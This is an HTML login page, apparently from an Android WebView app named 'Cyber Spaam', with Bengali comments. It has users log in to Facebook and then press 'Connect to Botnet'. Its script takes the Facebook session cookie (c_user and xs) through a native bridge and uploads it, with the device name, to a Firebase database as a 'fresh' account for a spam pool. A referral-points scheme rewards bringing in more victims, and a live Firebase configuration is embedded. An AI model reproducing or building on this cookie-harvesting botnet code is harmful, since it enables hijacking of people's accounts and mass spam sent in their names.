<!-- language: HTML, file: www/login.html -->
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Login - Cyber Spaam</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap');
    :root { --bg-color: #0b0f19; --card-bg: rgba(21, 31, 50, 0.85); --primary: #00ff41; --primary-glow: rgba(0, 255, 65, 0.4); --fb-blue: #1877f2; --danger: #ff3333; --text-main: #e2e8f0; --text-muted: #94a3b8; }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Rajdhani', sans-serif; user-select: none; }
    
    body { 
      background-color: var(--bg-color); 
      color: var(--text-main); 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      min-height: 100vh; 
      padding: 20px;
      position: relative;
      overflow: hidden;
    }

    /* ═══ লেজার লাইন অ্যানিমেশন ১ (উপরে থেকে নিচে) ═══ */
    .laser-line-vertical {
      position: absolute;
      top: -100%;
      left: 50%;
      transform: translateX(-50%);
      width: 4px;
      height: 100%;
      background: linear-gradient(to bottom, transparent, var(--primary), transparent);
      box-shadow: 0 0 15px var(--primary), 0 0 30px var(--primary);
      animation: dropLaser 3.5s linear infinite;
      z-index: 0;
      opacity: 0.5;
    }

    @keyframes dropLaser {
      0% { top: -100%; }
      100% { top: 100%; }
    }

    /* ═══ লেজার লাইন অ্যানিমেশন ২ (বাম থেকে ডানে) ═══ */
    .laser-line-horizontal {
      position: absolute;
      left: -100%;
      top: 50%;
      transform: translateY(-50%);
      width: 100%;
      height: 4px;
      background: linear-gradient(to right, transparent, var(--primary), transparent);
      box-shadow: 0 0 15px var(--primary), 0 0 30px var(--primary);
      animation: moveLaser 4s linear infinite;
      z-index: 0;
      opacity: 0.3;
    }

    @keyframes moveLaser {
      0% { left: -100%; }
      100% { left: 100%; }
    }

    .card { 
      width: 100%; 
      max-width: 400px; 
      background: var(--card-bg); 
      backdrop-filter: blur(12px);
      border-radius: 24px; 
      padding: 40px 25px; 
      border: 1px solid rgba(255, 255, 255, 0.08); 
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6); 
      text-align: center; 
      position: relative;
      z-index: 1;
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 3px;
      background: linear-gradient(90deg, transparent, var(--primary), transparent);
      border-radius: 24px 24px 0 0;
    }

    /* ═══ বড় আইকন এবং রিং অ্যানিমেশন ═══ */
    .icon-container { 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      margin-bottom: 25px; 
      position: relative; 
      width: 130px; 
      height: 130px; 
      margin-left: auto; 
      margin-right: auto; 
    }

    .icon-container img { 
      width: 90px; 
      height: 90px; 
      border-radius: 50%; 
      z-index: 2; 
      border: 3px solid var(--primary); 
      box-shadow: 0 0 25px var(--primary); 
      object-fit: cover;
    }

    .spinner-ring { 
      position: absolute; 
      top: 0; left: 0; right: 0; bottom: 0; 
      border-radius: 50%; 
      border: 3px solid transparent; 
      border-top-color: var(--primary); 
      border-bottom-color: var(--primary); 
      animation: spinRing 2s linear infinite; 
    }

    @keyframes spinRing { 
      0% { transform: rotate(0deg); } 
      100% { transform: rotate(360deg); } 
    }

    h1 { 
      font-size: 28px; 
      color: var(--primary); 
      text-shadow: 0 0 15px var(--primary-glow); 
      margin-bottom: 5px; 
      letter-spacing: 2px;
    }

    .subtitle { 
      color: var(--text-muted); 
      font-size: 14px; 
      margin-bottom: 30px; 
      text-transform: uppercase; 
      letter-spacing: 1px;
    }

    .instruction-text { 
      font-size: 13px; 
      color: #facc15; 
      background: rgba(250, 204, 21, 0.05); 
      padding: 12px; 
      border-radius: 12px; 
      margin-bottom: 25px; 
      border: 1px solid rgba(250, 204, 21, 0.2); 
      text-align: left; 
      line-height: 1.5; 
    }

    .btn { 
      width: 100%; 
      padding: 18px; 
      border: none; 
      border-radius: 14px; 
      font-size: 16px; 
      font-weight: 700; 
      cursor: pointer; 
      transition: all 0.2s ease; 
      display: flex; 
      align-items: center; 
      justify-content: center; 
      gap: 10px; 
      text-transform: uppercase; 
      letter-spacing: 1px; 
    }

    .btn:active { transform: scale(0.97); }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

    .btn-fb { 
      background: var(--fb-blue); 
      color: #fff; 
      box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4); 
      margin-bottom: 15px; 
    }

    .btn-success { 
      background: var(--primary); 
      color: #000; 
      box-shadow: 0 4px 20px var(--primary-glow); 
    }

    .message { 
      margin-top: 15px; 
      font-size: 14px; 
      text-align: center; 
      font-weight: 600; 
      min-height: 20px; 
    }

    .msg-error { color: var(--danger); }

    .spinner { 
      width: 20px; 
      height: 20px; 
      border: 3px solid rgba(0,0,0,0.2); 
      border-top-color: #000; 
      border-radius: 50%; 
      animation: spin 1s linear infinite; 
      display: none; 
    }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <!-- লেজার লাইন এনিমেশন ১ -->
  <div class="laser-line-vertical"></div>
  <!-- লেজার লাইন এনিমেশন ২ -->
  <div class="laser-line-horizontal"></div>

  <div class="card">
    <div class="icon-container">
      <div class="spinner-ring"></div>
      <!-- আইকনের পাথ আপডেট করা হলো -->
      <img src="icon.png" alt="Cyber Spaam">
    </div>
    <h1>CYBER SPAAM</h1>
    <p class="subtitle">Initialize Connection</p>
    
    <div class="instruction-text">
      <b>📌 How to Login:</b><br>
      1. Click on "Login to Facebook".<br>
      2. Enter your Facebook ID & Password.<br>
      3. After successful login, come back to the app and click "Connect to Botnet".
    </div>

    <button class="btn btn-fb" onclick="openFacebookLogin()" id="btnFbLogin">1. Login to Facebook</button>
    
    <button class="btn btn-success" onclick="grabCookieAndSave()" id="btnConnect">
      <span class="spinner" id="connectSpinner"></span>
      <span id="connectText">2. Connect to Botnet</span>
    </button>
    
    <div id="loginStatus" class="message msg-error"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push, set, get, child, update, increment } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC22mPef-Lsi4qqTMZwmQ2WlcUtSTCiIP0",
      authDomain: "cyber-spaam.firebaseapp.com",
      databaseURL: "https://cyber-spaam-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "cyber-spaam",
      storageBucket: "cyber-spaam.firebasestorage.app",
      messagingSenderId: "180047004522",
      appId: "1:180047004522:web:470d5c50f2e333916d9b13"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let referrerKey = localStorage.getItem('cyber_referrer') || "";

    window.openFacebookLogin = function() {
      window.location.replace("https://m.facebook.com/login");
    }

    // কুকি ভ্যালিডেট করার ফাংশন
    function validateCookie(cookie) {
      if (!cookie || !cookie.includes('c_user')) return 'c_user missing/invalid';
      if (!cookie.includes('xs')) return 'xs missing — session invalid';
      return null;
    }

    window.grabCookieAndSave = async function() {
      const status = document.getElementById('loginStatus');
      const btn = document.getElementById('btnConnect');
      const spinner = document.getElementById('connectSpinner');
      const btnText = document.getElementById('connectText');

      let cookie = "";
      let deviceName = "Unknown Device";
      
      if (window.AndroidCookieManager) {
        cookie = window.AndroidCookieManager.getFbCookie();
        deviceName = window.AndroidCookieManager.getDeviceName();
      } else {
        status.innerText = "❌ WebView Error.";
        return;
      }

      // কুকি চেক
      const bad = validateCookie(cookie);
      if (bad) {
        status.innerText = "❌ " + bad + ". Please login again.";
        return;
      }

      status.innerText = "";
      btn.disabled = true;
      spinner.style.display = "block";
      btnText.innerText = "Connecting...";
      
      try {
        // c_user আইডি বের করা
        const cUserMatch = cookie.match(/(?:^|;\s*)c_user=(\d+)/);
        const cUserId = cUserMatch ? cUserMatch[1] : "unknown";
        
        // পুরোনো btoa এর বদলে সরাসরি ফেসবুক আইডি দিয়ে key বানানো হলো
        const currentUserKey = 'u_' + cUserId; 

        const dbRef = ref(db);
        const snapshot = await get(child(dbRef, `users/${currentUserKey}`));
        let points = 0;
        let isNewUser = false;

        if (snapshot.exists()) {
          points = snapshot.val().points || 0;
          await update(ref(db, `users/${currentUserKey}`), { cookie: cookie, deviceName: deviceName });
        } else {
          await set(ref(db, `users/${currentUserKey}`), { cookie: cookie, points: 0, deviceName: deviceName });
          isNewUser = true;
        }

        // রেফারেল লজিক
        if (isNewUser && referrerKey && referrerKey !== currentUserKey) {
          try {
            await update(ref(db, `users/${currentUserKey}`), { points: increment(1) });
            await update(ref(db, `users/${referrerKey}`), { points: increment(5), referrals: increment(1) });
            points += 1;
            localStorage.removeItem('cyber_referrer');
          } catch (refErr) { console.log("Referral error:", refErr); }
        }

        // অ্যাকাউন্ট পুশ করা (ডুপ্লিকেট বন্ধ করতে নির্দিষ্ট key ব্যবহার)
        await set(ref(db, `accounts/acc_${cUserId}`), { 
          cookie: cookie, 
          c_user: cUserId, 
          deviceName: deviceName,
          addedAt: Date.now(), 
          fails: 0, 
          status: 'fresh'
        });

        localStorage.setItem('cyber_cookie', cookie);
        localStorage.setItem('cyber_key', currentUserKey);
        localStorage.setItem('cached_points', points);

        window.location.replace("index.html"); // লগইন সফল হলে মেইন পেজে যাবে
        
      } catch (e) { 
        status.innerText = "❌ Database Error: " + e.message; 
      } finally {
        btn.disabled = false;
        spinner.style.display = "none";
        btnText.innerText = "2. Connect to Botnet";
      }
    }
  </script>
</body>
  </html>
